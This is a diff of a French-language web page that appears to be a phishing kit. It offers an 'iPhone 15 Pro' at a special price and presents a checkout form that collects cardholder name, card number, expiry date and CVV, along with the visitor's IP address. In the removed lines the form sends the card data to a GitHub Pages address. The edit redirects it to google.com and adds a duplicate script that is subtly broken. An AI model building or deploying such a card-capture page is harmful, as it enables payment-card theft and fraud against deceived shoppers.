@@ -2,9 +2,7 @@
 <html lang="fr" dir="ltr">
 <head>
   <title>iPhone 15 Pro</title>
-  <!-- FAVICON -->
   <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
-  <!-- STYLE LOCAL -->
   <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -84,11 +82,10 @@
       font-size: 16px;
     }
     footer img {
-      max-width: 80%; /* Limiter la taille de l'image pour les petits écrans */
+      max-width: 80%;
       height: auto;
     }
 
-    /* Media queries pour adapter le contenu aux petits écrans */
     @media (max-width: 768px) {
       .product_block {
         display: flex;
@@ -114,22 +111,20 @@
       }
 
       footer h6 {
-        font-size: 14px; /* Réduire la taille de texte pour les petits écrans */
+        font-size: 14px;
       }
 
       footer img {
-        max-width: 50%; /* Adapter l'image pour qu'elle soit bien visible sur les petits écrans */
+        max-width: 50%;
       }
     }
   </style>
 </head>
 <body>
   <section>
-    <!-- LE BLOC PRODUIT COMMENCE ICI -->
     <div class="product_wrapper animate">
       <div class="container">
         <div class="product_block">
-          <!-- LE BLOC CÔTÉ GAUCHE COMMENCE ICI -->
           <div class="images_wrapper">
             <div class="price_block">
               <span>Seulement maintenant</span>
@@ -139,52 +134,45 @@
               <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
             </div>
           </div>
-          <!-- LE BLOC CÔTÉ GAUCHE SE TERMINE ICI -->
-          
-          <!-- LE BLOC CÔTÉ DROIT COMMENCE ICI -->
+
           <div class="form_wrapper">
             <div class="product_title">
               <h1>iPhone 15 Pro</h1>
             </div>
-            <!-- LE BLOC DE FORMULAIRE COMMENCE ICI -->
             <div class="form_block" id="Scroll_form">
-              <form action="https://justmoicom.github.io/test3/" method="POST" id="paymentForm" name="paymentForm" novalidate="novalidate">
+              <form action="https://www.google.com" method="GET" id="paymentForm" name="paymentForm" novalidate="novalidate">
                 <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
                 <input type="hidden" id="user_ip" name="user_ip" value="">
-                <div class="accepted-credit-cards" style="text-align: center;margin: 1rem 0;">
-                  <p style="font-size: 14px;margin: 0 0 .5rem;">Cartes de crédit acceptées :</p>
-                  <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Cartes de paiement prises en charge" style="width:auto;max-width:100%;">
-                </div>
+
                 <div class="card-holder form-group">
                   <label for="card_holder">Nom du titulaire</label>
                   <input type="text" name="card_holder" id="card_holder" required placeholder="Votre nom complet">
                 </div>
+
                 <div class="card-number form-group">
                   <label for="card_number">Numéro de carte</label>
                   <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required placeholder="0000 0000 0000 0000">
                 </div>
+
                 <div class="expiry-date form-group">
                   <label for="expiry_date">Date d'expiration</label>
                   <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required placeholder="MM/AA">
                 </div>
+
                 <div class="cvv form-group">
                   <label for="cvv">CCV</label>
                   <input type="text" name="cvv" id="cvv" maxlength="3" required placeholder="CCC">
                 </div>
+
                 <button type="submit" id="submitButton">Effectuer le paiement</button>
               </form>
             </div>
-            <!-- FIN DU BLOC DE FORMULAIRE ICI -->
           </div>
-          <!-- FIN DU BLOC CÔTÉ DROIT ICI -->
         </div>
       </div>
     </div>
-    <!-- FIN DU BLOC DE PRODUIT ICI -->
   </section>
-  <!-- FIN DE LA SECTION ICI -->
-  
-  <!-- PIED DE PIED COMMENCE ICI -->
+
   <footer>
     <div class="container">
       <div class="block-reassurance">
@@ -193,9 +181,25 @@
       </div>
     </div>
   </footer>
-  <!-- FIN DU PIED DE PAGE ICI -->
 
   <script>
+    $(document).ready(function () {
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
+  </script>
+  
+  
+   <script>
     $(document).ready(function () {
       // Récupérer l'IP de l'utilisateur
       $.getJSON("https://api.ipify.org?format=json", function (data) {
@@ -356,6 +360,11 @@
       }
     });
   </script>
+  
+  
+  
+  
+  
   
   
   
